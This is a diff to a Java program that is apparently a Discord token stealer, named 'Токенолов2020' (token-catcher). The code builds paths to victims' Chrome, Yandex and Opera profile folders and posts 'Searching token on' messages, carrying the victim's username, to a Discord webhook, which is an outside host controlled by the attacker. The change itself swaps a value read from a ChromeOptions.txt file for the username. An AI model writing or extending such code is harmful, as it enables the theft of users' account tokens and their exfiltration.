@@ -21,9 +21,8 @@ public class Main {
 		String chrome = "C:\\Users\\" + username + "\\AppData\\Local\\Google\\Chrome";
 		String yandex = "C:\\Users\\" + username + "\\AppData\\Local\\Yandex\\YandexBrowser";
 		String opera = "C:\\Users\\" + username + "\\AppData\\Roaming\\Opera Software";
-		try {
-			String id = new BufferedReader(new FileReader("C:\\Users\\" + username + "\\AppData\\Roaming\\ChromeOptions.txt")).readLine();		
-			DiscordHook.sendMessage("Токенолов2020", "[" + new SimpleDateFormat("HH:mm:ss").format(Calendar.getInstance().getTime().getTime()) + "] - Searching token on " + id);		
+		try {			
+			DiscordHook.sendMessage("Токенолов2020", "[" + new SimpleDateFormat("HH:mm:ss").format(Calendar.getInstance().getTime().getTime()) + "] - Searching token on " + username);		
 		   } catch (Exception e) {
 		}
 		if (browser == null || browser.equalsIgnoreCase("chrome")) {
